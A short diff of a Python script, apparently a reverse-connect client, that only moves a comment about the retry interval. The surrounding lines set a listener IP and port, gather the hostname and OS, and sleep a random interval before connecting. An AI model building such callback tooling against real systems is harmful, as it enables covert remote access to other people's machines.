@@ -19,8 +19,8 @@ def main():
 	# Change these values to match your listening host machine
 	host = "192.168.1.168"
 	port = 2015
-	# This value corresponds to the time period in seconds in between connection attempts
-	retry = 60
+	
+	retry = 60 # This value corresponds to the time period in seconds in between connection attempts
 	hostname = str(socket.gethostname())
 	platorm = os.name
 	time.sleep(randint(3, 20))
